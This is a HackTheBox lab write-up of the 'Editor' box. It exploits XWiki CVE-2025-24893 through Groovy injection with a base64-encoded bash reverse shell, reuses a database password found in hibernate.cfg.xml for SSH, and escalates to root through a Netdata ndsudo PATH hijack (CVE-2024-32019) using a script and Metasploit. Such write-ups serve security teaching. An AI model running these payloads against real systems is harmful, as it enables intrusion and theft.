# HackTheBox — Editor | Full Writeup

> **Difficulty:** Medium  
> **OS:** Linux (Ubuntu 22.04)  
> **IP:** 10.129.231.23  

---

## Table of Contents

1. [Overview & Attack Chain](#overview--attack-chain)
2. [Reconnaissance](#reconnaissance)
3. [Enumeration — Port 80 (editor.htb)](#enumeration--port-80-editorhtb)
4. [Enumeration — Port 8080 (XWiki)](#enumeration--port-8080-xwiki)
5. [Foothold — CVE-2025-24893 (XWiki RCE)](#foothold--cve-2025-24893-xwiki-rce)
6. [Credential Discovery & Lateral Movement](#credential-discovery--lateral-movement)
7. [Privilege Escalation — CVE-2024-32019 (Netdata ndsudo)](#privilege-escalation--cve-2024-32019-netdata-ndsudo)
8. [Flags](#flags)
9. [Lessons Learned](#lessons-learned)

---

## Overview & Attack Chain

Editor is a medium-difficulty Linux box built around a realistic developer environment — a web-based code editor fronting a self-hosted XWiki instance. The attack chain follows a logical progression from public exploit to credential reuse to a known Netdata SUID vulnerability:

```
Port Scan
    └── Port 8080 → XWiki 15.10.8
            └── CVE-2025-24893 (Unauthenticated RCE via SolrSearch Groovy injection)
                    └── Shell as xwiki
                            └── /etc/xwiki/hibernate.cfg.xml → DB credentials
                                    └── Password reuse → SSH as oliver
                                            └── oliver ∈ netdata group
                                                    └── CVE-2024-32019 (ndsudo PATH hijacking)
                                                            └── ROOT
```

---

## Reconnaissance

### Nmap — Initial Port Scan

```bash
nmap -sC -sV -oN nmap_initial.txt 10.129.231.23
```

**Results:**

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
```

**What this tells us:**

- Port 22 — SSH is available. We'll need credentials to use it.
- Port 80 — An nginx web server. Good starting point for web enumeration.
- Port 8080 — Jetty is a Java-based HTTP server, commonly used to host enterprise apps like JIRA, XWiki, Confluence, etc. This is immediately interesting.

### Virtual Host Discovery

Browsing to `http://10.129.231.23` redirected to `editor.htb`. We added this and a discovered subdomain to `/etc/hosts`:

```bash
echo "10.129.231.23 editor.htb wiki.editor.htb" >> /etc/hosts
```

The subdomain `wiki.editor.htb` was found by inspecting the JavaScript bundle of the React app on port 80 — the app leaked the internal XWiki URL in its bundled source code.

---

## Enumeration — Port 80 (editor.htb)

Browsing to `http://editor.htb` revealed a React/Vite SPA called **SimplistCode Pro** — a browser-based code editor.

**Key findings from this page:**

- Downloadable assets at `/assets/simplistcode_1.0.deb` and `/assets/simplistcode_1.0.exe`
- The JavaScript bundle at `/assets/index-*.js` contained a hardcoded reference to `wiki.editor.htb/xwiki/` — this revealed the internal XWiki vhost

**How the vhost was discovered:**

```bash
# View page source or use browser devtools → Network tab → JS bundles
# Search the bundle for internal URLs
curl -s http://editor.htb/assets/index.js | grep -oE 'https?://[^"]+' | sort -u
```

This told us the code editor UI talked to a backend wiki — a critical piece of information for building the attack chain.

**nginx config (discovered later from the shell):**

```nginx
# editor.htb → serves /var/www/html (React SPA)
# wiki.editor.htb → reverse proxy to 127.0.0.1:8080 (XWiki)
```

---

## Enumeration — Port 8080 (XWiki)

Browsing to `http://wiki.editor.htb` (or `http://10.129.231.23:8080`) revealed an **XWiki 15.10.8** instance running on Jetty 10.0.20.

### XWiki Fingerprinting

```bash
curl -s http://editor.htb:8080/xwiki/bin/view/Main/ | grep -i "version\|xwiki"
```

Key observations:
- XWiki version: **15.10.8**
- Running as unauthenticated guest (`XWikiGuest`)
- User `neal` (Neal Bagwell) was visible as the last editor of the homepage
- WebDAV was enabled (`PROPFIND`, `LOCK`, `UNLOCK`)
- `XWiki.hasEdit` and `XWiki.hasProgramming` were both **false** for the guest user

### Why This Version Matters

XWiki 15.10.8 falls below the patched version **15.10.11**. A quick search reveals:

- **CVE-2025-24893** — Unauthenticated RCE via the SolrSearch macro, affecting XWiki < 15.10.11
- CVSS Score: **9.8 Critical**

This is the vulnerability we need for initial access.

---

## Foothold — CVE-2025-24893 (XWiki RCE)

### Vulnerability Explanation

CVE-2025-24893 is a Server-Side Template Injection / Groovy code injection vulnerability in XWiki's SolrSearch component. The `text` parameter of the `/xwiki/bin/get/Main/SolrSearch` endpoint is passed to a Groovy interpreter without proper sanitization, even for unauthenticated requests.

The injection payload uses XWiki's macro syntax to break out of the search context and execute arbitrary Groovy code:

```
}}}{{async async=false}}{{groovy}}<GROOVY CODE HERE>{{/groovy}}{{/async}}
```

### Step 1 — Verify RCE

```bash
curl -s "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=}}}{{async%20async=false}}{{groovy}}println(%22PWNED:%22+(7*7)){{/groovy}}{{/async}}"
```

The response contained `PWNED:49` — confirming unauthenticated remote code execution.

### Step 2 — Prepare Reverse Shell Payload

We base64-encoded a bash reverse shell to avoid issues with special characters in the URL:

```bash
# Payload: bash -i >& /dev/tcp/***REMOVED***/4444 0>&1
echo "bash -i >& /dev/tcp/***REMOVED***/4444 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMi80NDQ0IDA+JjE=
```

### Step 3 — Start Listener

```bash
nc -lvnp 4444
```

### Step 4 — Trigger the Reverse Shell

```bash
curl -G "http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch" \
  --data-urlencode 'media=rss' \
  --data-urlencode 'text=}}}{{async async=false}}{{groovy}}["bash","-c","echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNi4zMi80NDQ0IDA+JjE= | base64 -d | bash"].execute(){{/groovy}}{{/async}}'
```

**Result:** Shell received as `xwiki@editor`.

### Step 5 — Stabilise the Shell

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z
stty raw -echo; fg
export TERM=xterm
```

---

## Credential Discovery & Lateral Movement

### Enumerating as xwiki

With a shell as the `xwiki` service account, we looked for configuration files that might contain credentials.

XWiki uses Hibernate for database connectivity, and its configuration file almost always contains database credentials:

```bash
cat /etc/xwiki/hibernate.cfg.xml
```

**Output (relevant section):**

```xml
<property name="connection.url">jdbc:mysql://localhost/xwiki</property>
<property name="connection.username">xwiki</property>
<property name="connection.password">***REMOVED***</property>
```

**Credentials found:** `xwiki:***REMOVED***`

### Why Try This Password for SSH?

A very common real-world pattern (and CTF pattern) is **password reuse** — developers and admins often use the same password across multiple services. We had:

- A database password for the `xwiki` DB user
- System users on the box: `root`, `oliver`, `xwiki`

The `xwiki` system user wouldn't be useful (service account). But `oliver` is a real user (uid=1000) — so we try the DB password for SSH.

### SSH as oliver

```bash
ssh oliver@10.129.231.23
# Password: ***REMOVED***
```

**Success.** We are now `oliver@editor`.

```bash
# Grab user flag
cat /home/oliver/user.txt
# 9f09c303fc99746add10cf29d7ef154e
```

---

## Privilege Escalation — CVE-2024-32019 (Netdata ndsudo)

### Enumeration as oliver

First, we checked oliver's groups and privileges:

```bash
id
# uid=1000(oliver) gid=1000(oliver) groups=1000(oliver),999(netdata)

sudo -l
# User oliver may not run sudo on editor.
```

Oliver has **no sudo rights**, but is a member of the **`netdata` group**. This is significant.

### Discovering Netdata SUID Binaries

Running LinPEAS or manually checking SUID binaries:

```bash
find / -perm -4000 -user root 2>/dev/null | grep netdata
```

**Results:**

```
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

The binary `ndsudo` stands out — it's SUID root and its name suggests it's a privilege escalation helper similar to `sudo`.

### Understanding CVE-2024-32019

**ndsudo** is a Netdata helper tool that allows the Netdata service (running as `netdata` user) to execute a specific whitelist of privileged commands (like `nvme`, `megacli`, `arcconf` for hardware monitoring) as root.

The vulnerability (**CVE-2024-32019**, CVSS 8.8) is a classic **CWE-426: Untrusted Search Path**:

- `ndsudo` restricts which *command names* can be run (e.g., only `nvme`, `megacli`)
- BUT it resolves the binary path using the **caller's `$PATH` environment variable**
- An attacker can place a malicious binary named `nvme` in a directory they control, prepend it to `$PATH`, and `ndsudo` will execute their malicious binary **as root**

**Affected versions:** Netdata Agent >= 1.44.0-60 and < 1.45.3

### Manual Exploitation Attempt (Shell Script — Failed)

We first tried creating a shell script:

```bash
cd /tmp
cat > /tmp/nvme << 'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
chmod 755 /tmp/nvme

PATH=/tmp:$PATH /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

This created `/tmp/rootbash` — but owned by **oliver**, not root. The shell script was executed by our user context rather than the SUID context. A compiled binary is required to properly inherit the SUID root privileges.

### Metasploit Exploitation (Success)

Since `gcc` was not available on the target, we used Metasploit from our Kali machine. Metasploit's module drops a compiled ELF binary payload — this is key, because only a compiled binary correctly inherits the SUID context.

**Step 1 — Establish a session via SSH:**

```bash
# In msfconsole
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.129.231.23
set USERNAME oliver
set PASSWORD ***REMOVED***
run
```

This opened **session 1** (raw SSH shell).

**Step 2 — Upgrade to Meterpreter:**

```bash
sessions -u 1
```

This spawned **session 2** — a Meterpreter session (`x86/linux`, running as oliver).

**Step 3 — Run the ndsudo exploit:**

```bash
use exploit/linux/local/ndsudo_cve_2024_32019
set SESSION 1
set LHOST ***REMOVED***
set LPORT 5556
set NdsudoPath /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
set WritableDir /tmp
set payload linux/x64/meterpreter/reverse_tcp
run
```

**What happened under the hood:**

1. Metasploit generated a compiled x64 ELF payload and uploaded it to `/tmp/nvme`
2. It triggered `ndsudo nvme-list` with `PATH=/tmp:$PATH`
3. `ndsudo` found our `/tmp/nvme` binary first in `PATH` and executed it as root (SUID)
4. The compiled payload called back to our handler with root privileges
5. Metasploit opened **session 3** — Meterpreter as `root@10.129.231.23`

**Step 4 — Interact with the root session:**

```bash
sessions -i 3
```

```
meterpreter > getuid
Server username: root

meterpreter > cat /root/root.txt
d4d4d8858e8ecf59216c7dac666ea776
```

---

## Lessons Learned

### Enumeration Mindset

**JS bundles leak internal infrastructure.** The vhost `wiki.editor.htb` was not discoverable via subdomain brute-forcing alone — it was hardcoded in the React app's JavaScript bundle. Always inspect client-side source code for internal URLs, API endpoints, and configuration hints.

**Service version → CVE.** The moment we identified XWiki 15.10.8, the question became: "what public CVEs exist for this version?" Version fingerprinting combined with CVE research is a core skill.

### Credential Reuse

Configuration files for service accounts (databases, message queues, APIs) almost always contain plaintext credentials. These should always be tested against:
- Other services on the same host (SSH, FTP, etc.)
- Other users on the system
- Web application login panels

### Why the Shell Script Failed (SUID Mechanics)

When a SUID binary executes a shell script (e.g., `/bin/sh script.sh`), the **shell process** drops the SUID privilege for security reasons. The `bash` and `sh` interpreters intentionally drop elevated privileges when they detect that the effective UID differs from the real UID, unless launched with the `-p` flag.

A **compiled C/ELF binary**, on the other hand, runs in the SUID context directly — it can call `setuid(0)` and maintain root privileges. This is why Metasploit's compiled payload worked where a shell script did not.

### CVE-2024-32019 Key Insight

The vulnerability is deceptively simple:
- The whitelist checks the **command name** (e.g., `nvme`) ✅
- But the **binary resolution** uses the caller's `$PATH` ❌

This is a textbook untrusted search path issue. The fix (Netdata v1.45.3) hardcodes absolute paths for all allowed commands instead of resolving them via `$PATH`.

---

*Writeup by k41r0s3 | HackTheBox | Editor*
